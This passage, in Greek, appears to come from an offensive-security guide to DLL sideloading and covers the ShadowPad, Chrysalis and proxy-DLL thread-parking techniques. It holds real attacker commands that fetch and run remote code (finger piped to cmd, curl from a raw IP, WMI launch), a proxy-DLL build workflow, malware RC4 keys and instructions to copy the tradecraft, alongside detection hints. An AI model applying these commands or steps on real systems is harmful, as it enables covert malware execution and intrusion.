- Τα KnownDLLs, το SxS και τα forwarded exports μπορούν να επηρεάσουν την προτεραιότητα και πρέπει να λαμβάνονται υπόψη κατά την επιλογή του host binary και του συνόλου exports.

## Υπογεγραμμένες τριάδες + κρυπτογραφημένα payloads (μελέτη περίπτωσης ShadowPad)

Η Check Point περιέγραψε πώς το Ink Dragon αναπτύσσει το ShadowPad χρησιμοποιώντας μια **τριάδα τριών αρχείων**, ώστε να μοιάζει με νόμιμο λογισμικό, διατηρώντας παράλληλα το βασικό payload κρυπτογραφημένο στον δίσκο:<sup>[[12]](#references)</sup>

1. **Υπογεγραμμένο host EXE** – γίνεται κατάχρηση λογισμικού προμηθευτών όπως η AMD, η Realtek ή η NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Οι επιτιθέμενοι μετονομάζουν το εκτελέσιμο ώστε να μοιάζει με binary των Windows (για παράδειγμα `conhost.exe`), αλλά η υπογραφή Authenticode παραμένει έγκυρη.
2. **Κακόβουλο loader DLL** – τοποθετείται δίπλα στο EXE με αναμενόμενο όνομα (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Το DLL είναι συνήθως ένα MFC binary που έχει γίνει obfuscate με το framework ScatterBrain· μοναδικός σκοπός του είναι να εντοπίσει το κρυπτογραφημένο blob, να το αποκρυπτογραφήσει και να κάνει reflective mapping του ShadowPad.
3. **Κρυπτογραφημένο blob payload** – συχνά αποθηκεύεται ως `<name>.tmp` στον ίδιο κατάλογο. Αφού κάνει memory-mapping το αποκρυπτογραφημένο payload, ο loader διαγράφει το αρχείο TMP για να καταστρέψει τα forensic στοιχεία.

Σημειώσεις tradecraft:

* Η μετονομασία του υπογεγραμμένου EXE (διατηρώντας το αρχικό `OriginalFileName` στην κεφαλίδα PE) του επιτρέπει να μεταμφιέζεται σε binary των Windows, διατηρώντας παράλληλα την υπογραφή του προμηθευτή. Επομένως, αναπαράγετε τη συνήθεια του Ink Dragon να τοποθετεί binaries που μοιάζουν με `conhost.exe`, αλλά στην πραγματικότητα είναι βοηθητικά προγράμματα AMD/NVIDIA.
* Επειδή το εκτελέσιμο παραμένει έμπιστο, τα περισσότερα controls allowlisting απαιτούν μόνο να βρίσκεται το κακόβουλο DLL δίπλα του. Εστιάστε στην προσαρμογή του loader DLL· το υπογεγραμμένο parent συνήθως μπορεί να εκτελεστεί χωρίς αλλαγές.
* Ο decryptor του ShadowPad απαιτεί το blob TMP να βρίσκεται δίπλα στον loader και να είναι εγγράψιμο, ώστε να μπορεί να μηδενίσει το αρχείο μετά το mapping. Διατηρήστε τον κατάλογο εγγράψιμο μέχρι να φορτωθεί το payload· μόλις αυτό βρεθεί στη μνήμη, το αρχείο TMP μπορεί να διαγραφεί με ασφάλεια για λόγους OPSEC.

### Αλυσίδα sideloading με LOLBAS stager και staged archive (finger → tar/curl → WMI)

Οι operators συνδυάζουν το DLL sideloading με LOLBAS, ώστε το μόνο προσαρμοσμένο artifact στον δίσκο να είναι το κακόβουλο DLL δίπλα στο έμπιστο EXE:<sup>[[1]](#references)</sup>

- **Loader απομακρυσμένων εντολών (Finger):** Το κρυφό PowerShell εκκινεί το `cmd.exe /c`, λαμβάνει εντολές από έναν Finger server και τις διοχετεύει στο `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - Το `finger user@host` λαμβάνει κείμενο μέσω TCP/79· το `| cmd` εκτελεί την απόκριση του server, επιτρέποντας στους operators να αλλάζουν το second stage από την πλευρά του server.

- **Ενσωματωμένη λήψη/αποσυμπίεση:** Κατεβάστε ένα archive με αθώα επέκταση, αποσυμπιέστε το και τοποθετήστε το sideload target και το DLL σε έναν τυχαίο φάκελο `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` αποκρύπτει την πρόοδο και ακολουθεί τις ανακατευθύνσεις· το `tar -xf` χρησιμοποιεί το ενσωματωμένο στα Windows `tar`.

- **Εκκίνηση WMI/CIM:** Εκκινήστε το EXE μέσω WMI, ώστε η τηλεμετρία να εμφανίζει μια διεργασία που δημιουργήθηκε από CIM κατά τη φόρτωση της DLL που βρίσκεται στον ίδιο φάκελο:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Λειτουργεί με binaries που προτιμούν τοπικά DLL (π.χ. `intelbq.exe`, `nearby_share.exe`): το payload (π.χ. Remcos) εκτελείται με το έμπιστο όνομα.

- **Αναζήτηση:** Δημιουργήστε alert για το `forfiles` όταν εμφανίζονται μαζί τα `/p`, `/m` και `/c`· είναι ασυνήθιστο εκτός από scripts διαχειριστών.


## Μελέτη περίπτωσης: NSIS dropper + sideload του Bitdefender Submission Wizard (Chrysalis)

Μια πρόσφατη εισβολή της Lotus Blossom καταχράστηκε μια έμπιστη αλυσίδα ενημέρωσης για να παραδώσει ένα NSIS-packed dropper που εγκαθιστούσε ένα DLL sideload και payloads που εκτελούνταν εξ ολοκλήρου στη μνήμη.<sup>[[13]](#references)</sup>

Ροή tradecraft
- Το `update.exe` (NSIS) δημιουργεί το `%AppData%\Bluetooth`, το χαρακτηρίζει **HIDDEN**, αποθηκεύει ένα μετονομασμένο Bitdefender Submission Wizard `BluetoothService.exe`, ένα κακόβουλο `log.dll` και ένα κρυπτογραφημένο blob `BluetoothService`, και έπειτα εκκινεί το EXE.
- Το host EXE εισάγει το `log.dll` και καλεί τα `LogInit`/`LogWrite`. Το `LogInit` φορτώνει το blob μέσω mmap· το `LogWrite` το αποκρυπτογραφεί με ένα stream βασισμένο σε προσαρμοσμένο LCG (σταθερές **0x19660D** / **0x3C6EF35F**, υλικό κλειδιού που προκύπτει από προηγούμενο hash), αντικαθιστά το buffer με plaintext shellcode, αποδεσμεύει προσωρινά δεδομένα και μεταβαίνει σε αυτό.
- Για να αποφύγει το IAT, ο loader επιλύει API κάνοντας hash στα ονόματα των exports με **FNV-1a basis 0x811C9DC5 + prime 0x1000193** και έπειτα εφαρμόζοντας ένα avalanche τύπου Murmur (**0x85EBCA6B**) και συγκρίνοντας με salted target hashes.

Κύριο shellcode (Chrysalis)
- Αποκρυπτογραφεί ένα κύριο module τύπου PE επαναλαμβάνοντας πράξεις add/XOR/sub με το κλειδί `gQ2JR&9;` σε πέντε περάσματα και έπειτα φορτώνει δυναμικά το `Kernel32.dll` → `GetProcAddress` για να ολοκληρώσει την επίλυση των imports.
- Ανακατασκευάζει συμβολοσειρές ονομάτων DLL κατά την εκτέλεση μέσω bit-rotate/XOR μετασχηματισμών ανά χαρακτήρα και έπειτα φορτώνει τα `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Χρησιμοποιεί δεύτερο resolver που διατρέχει το **PEB → InMemoryOrderModuleList**, αναλύει κάθε export table σε μπλοκ των 4 byte με mixing τύπου Murmur και χρησιμοποιεί το `GetProcAddress` μόνο ως fallback αν δεν βρεθεί το hash.

Ενσωματωμένη διαμόρφωση και C2
- Η διαμόρφωση βρίσκεται μέσα στο αποθηκευμένο αρχείο `BluetoothService` στη **μετατόπιση 0x30808** (μέγεθος **0x980**) και αποκρυπτογραφείται με RC4 με το κλειδί `qwhvb^435h&*7`, αποκαλύπτοντας το C2 URL και το User-Agent.
- Τα beacons δημιουργούν ένα dot-delimited host profile, προσθέτουν μπροστά το tag `4Q` και έπειτα το κρυπτογραφούν με RC4 με το κλειδί `vAuig34%^325hGV` πριν από το `HttpSendRequestA` μέσω HTTPS. Οι απαντήσεις αποκρυπτογραφούνται με RC4 και δρομολογούνται μέσω ενός tag switch (`4T` shell, `4V` εκτέλεση διεργασίας, `4W/4X` εγγραφή αρχείου, `4Y` ανάγνωση/exfil, `4\\` απεγκατάσταση, `4` απαρίθμηση drive/αρχείων + περιπτώσεις chunked transfer).
- Η λειτουργία εκτέλεσης καθορίζεται από τα CLI args: χωρίς args = εγκατάσταση persistence (service/Run key) που δείχνει στο `-i`· το `-i` επανεκκινεί το ίδιο με `-k`· το `-k` παραλείπει την εγκατάσταση και εκτελεί το payload.

Εναλλακτικός loader που εντοπίστηκε
- Η ίδια εισβολή εγκατέστησε το Tiny C Compiler και εκτέλεσε το `svchost.exe -nostdlib -run conf.c` από το `C:\ProgramData\USOShared\`, με το `libtcc.dll` δίπλα του. Ο C source κώδικας που παρείχε ο εισβολέας περιείχε ενσωματωμένο shellcode, γινόταν compile και εκτελούνταν στη μνήμη χωρίς να εγγραφεί PE στον δίσκο. Αναπαραγάγετέ το με:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Αυτό το στάδιο compile-and-run που βασίζεται στο TCC εισήγαγε το `Wininet.dll` κατά τον χρόνο εκτέλεσης και ανέκτησε δεύτερου σταδίου shellcode από ένα hardcoded URL, προσφέροντας έναν ευέλικτο loader που μεταμφιέζεται σε εκτέλεση compiler.

## Signed-host sideloading with export proxying + host thread parking

Ορισμένες αλυσίδες DLL sideloading προσθέτουν **τεχνικές σταθεροποίησης**, ώστε η νόμιμη διεργασία-ξενιστής να παραμένει ενεργή για αρκετό χρόνο, επιτρέποντας την ομαλή φόρτωση των επόμενων σταδίων αντί να καταρρεύσει μετά τη φόρτωση του κακόβουλου DLL.<sup>[[11]](#references)</sup>

Παρατηρούμενο μοτίβο
- Τοποθέτηση ενός αξιόπιστου EXE δίπλα σε ένα κακόβουλο DLL με το αναμενόμενο όνομα εξάρτησης, όπως `version.dll`.
- Το κακόβουλο DLL **προωθεί κάθε αναμενόμενο export** στο πραγματικό DLL συστήματος (για παράδειγμα, `%SystemRoot%\\System32\\version.dll`), ώστε να επιτύχει η επίλυση των imports και να συνεχίσει να λειτουργεί η διεργασία-ξενιστής.
- Μετά τη φόρτωση, το κακόβουλο DLL **τροποποιεί το entry point του ξενιστή**, ώστε το κύριο thread να μπαίνει σε έναν ατέρμονο βρόχο `Sleep` αντί να τερματίζεται ή να εκτελεί διαδρομές κώδικα που θα τερμάτιζαν τη διεργασία.
- Ένα νέο thread εκτελεί την πραγματική κακόβουλη εργασία: αποκρυπτογραφεί το όνομα ή τη διαδρομή του DLL επόμενου σταδίου (συχνά χρησιμοποιούνται RC4/XOR) και έπειτα το εκκινεί με `LoadLibrary`.

Γιατί έχει σημασία
- Η συνήθης προώθηση DLL διατηρεί τη συμβατότητα των API, αλλά δεν εγγυάται ότι ο ξενιστής θα παραμείνει ενεργός για αρκετό χρόνο, ώστε να εκτελεστούν τα επόμενα στάδια.
- Η ακινητοποίηση του κύριου thread με `Sleep(INFINITE)` είναι ένας απλός τρόπος να διατηρηθεί ενεργή η υπογεγραμμένη διεργασία, ενώ ο loader εκτελεί αποκρυπτογράφηση, staging ή αρχικοποίηση δικτυακής επικοινωνίας σε ένα worker thread.
- Η αναζήτηση μόνο για ύποπτο `DllMain` μπορεί να παραβλέψει αυτό το μοτίβο, αν η ενδιαφέρουσα συμπεριφορά εκδηλωθεί αφού τροποποιηθεί το entry point του ξενιστή και ξεκινήσει ένα δευτερεύον thread.

Ελάχιστη ροή εργασίας
1. Αντιγράψτε το υπογεγραμμένο EXE-ξενιστή και εντοπίστε το DLL που αναζητά στον τοπικό κατάλογο.
2. Δημιουργήστε ένα proxy DLL που εξάγει τις ίδιες συναρτήσεις και τις προωθεί στο νόμιμο DLL.
3. Στο `DllMain(DLL_PROCESS_ATTACH)`, δημιουργήστε ένα worker thread.
4. Από αυτό το thread, τροποποιήστε το entry point του ξενιστή ή τη ρουτίνα εκκίνησης του κύριου thread, ώστε να εκτελεί επαναλαμβανόμενα `Sleep`.
5. Αποκρυπτογραφήστε το όνομα/τη διαμόρφωση του DLL επόμενου σταδίου και καλέστε `LoadLibrary` ή φορτώστε χειροκίνητα το payload στη μνήμη.

Αμυντικά σημεία διερεύνησης
- Υπογεγραμμένες διεργασίες που φορτώνουν το `version.dll` ή παρόμοιες συνηθισμένες βιβλιοθήκες από τον δικό τους κατάλογο εφαρμογής αντί για το `System32`.
- Τροποποιήσεις στη μνήμη στο entry point της διεργασίας λίγο μετά τη φόρτωση του image, ιδιαίτερα άλματα/κλήσεις που ανακατευθύνονται σε `Sleep`/`SleepEx`.
- Threads που δημιουργούνται από proxy DLL και καλούν αμέσως `LoadLibrary` για ένα δεύτερο DLL με αποκρυπτογραφημένο όνομα.
- Proxy DLL που εξάγουν όλες τις συναρτήσεις και τοποθετούνται δίπλα σε εκτελέσιμα προμηθευτών, μέσα σε εγγράψιμους καταλόγους staging, όπως `ProgramData`, `%TEMP%` ή διαδρομές αποσυμπιεσμένων αρχείων.

## References

- [1] [Red Canary – Πληροφορίες από τις υπηρεσίες πληροφοριών: Ιανουάριος 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Κλιμάκωση προνομίων μέσω του TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking στα Windows. Απλό παράδειγμα σε C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Η Nimbus Manticore αναπτύσσει νέο malware με στόχο την Ευρώπη](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Όταν τα DLL Hijacks συναντούν τα βοηθητικά προγράμματα των Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Ψηφιακοί σωσίες: Ανατομία εξελισσόμενων εκστρατειών πλαστοπροσωπίας που διανέμουν το Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Συγκλίνοντα συμφέροντα: Ανάλυση ομάδων απειλών που στοχεύουν κυβέρνηση της Νοτιοανατολικής Ασίας](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Μέσα στον Ink Dragon: Αποκαλύπτοντας το δίκτυο relay και την εσωτερική λειτουργία μιας συγκαλυμμένης επιθετικής επιχείρησης](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Το Chrysalis Backdoor: Μια εις βάθος ανάλυση του toolkit της Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno: αλυσίδα ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Παρακολούθηση των εκστρατειών κατασκοπείας του 2026 της ιρανικής APT Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Στοιχείο `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Στοιχείο `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Στοιχείο `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Στοιχείο `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Στοιχείο `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Στοιχείο `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Επιχειρήσεις της Nimbus Manticore κατά τη διάρκεια της ιρανικής σύγκρουσης](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Ενέργειες εργασιών](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – Η CL-STA-1062 στοχεύει κυβερνήσεις και κρίσιμες υποδομές της Νοτιοανατολικής Ασίας](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Ανακατασκευή και εντοπισμός του Windows DLL Search-Order Hijacking με το Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Δημιουργία native βιβλιοθηκών με Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Native exports με Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Σειρά αναζήτησης dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – Μορφή PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Αποκάλυψη μιας παραλλαγής του SectopRAT ενσωματωμένης σε νόμιμο λογισμικό](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – Κλέβοντας το LIGHTSHOW (Μέρος πρώτο)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Επιχείρηση FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
